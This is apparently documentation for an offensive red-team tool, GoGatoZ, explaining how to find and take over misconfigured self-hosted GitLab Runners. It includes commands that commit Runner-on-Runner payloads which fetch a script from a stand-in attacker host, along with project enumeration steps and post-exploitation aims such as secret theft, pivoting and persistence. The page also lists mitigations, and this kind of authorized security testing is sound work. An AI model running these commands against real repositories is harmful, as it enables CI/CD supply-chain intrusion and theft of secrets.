---
title: Self-Hosted Runner Takeover
description: Identify and exploit misconfigurations in self-hosted GitLab Runners
---

This guide explains how to identify and exploit misconfigurations in self-hosted GitLab Runners using GoGatoZ. Use only with explicit authorization.

## Quick start

- Discover runner tags available to a project:
```bash
gogatoz attack --target group/project --discover-tags
```

- Generate a Runner-on-Runner payload (render only):
```bash
gogatoz attack --payload runner-on-runner \
  --script-url https://attacker.example/p.sh --os linux --keepalive 30 \
  --job-name ror --stage attack --tags docker,priv --payload-only
```

- Commit a RoR payload to a branch:
```bash
gogatoz attack --commit-ci --target group/project \
  --payload ror --script-url https://attacker/p.sh --tags shell \
  --branch gogatoz-attack --deconflict suffix --message "stage RoR payload"
```

For more options (Windows/macOS runners, shell vs docker executors, keep-alive), see the [Attack Command](/user-guide/command-reference/attack/) docs.

## Understanding Self-Hosted Runner Vulnerabilities

Self-hosted runners can be vulnerable in several ways:

1. **Public Repository Runners**: Runners configured to run pipelines from public repositories without approval requirements
2. **Fork Merge Request Vulnerabilities**: Runners that process merge requests from forks without proper restrictions
3. **TOCTOU Vulnerabilities**: Time-of-check to time-of-use vulnerabilities in pipeline approval processes
4. **Misconfigured Permissions**: Runners with excessive permissions on the host system

## Identifying Vulnerable Runners

### Step 1: Search for projects using self-hosted runners

```bash
gogatoz search -q "runner" --code-content "tags:" --json > runner_candidates.json
```

### Step 2: Enumerate for vulnerable configurations

```bash
jq -r '.[].path_with_namespace' runner_candidates.json > runner_projects.txt
gogatoz enumerate -i runner_projects.txt --json | jq '.[] | select(.findings | length > 0)'
```

## Post-Exploitation

Once you have access to a self-hosted runner, you can:

1. Explore the runner environment
2. Access secrets available to the runner
3. Pivot to other systems on the same network
4. Establish persistence

## Mitigation Recommendations

If you identify vulnerable self-hosted runners in your organization:

1. Implement approval requirements for pipelines from forks
2. Use ephemeral runners that are destroyed after each job
3. Apply the principle of least privilege to runner permissions
4. Isolate runners in containers or VMs
5. Implement network segmentation for runners
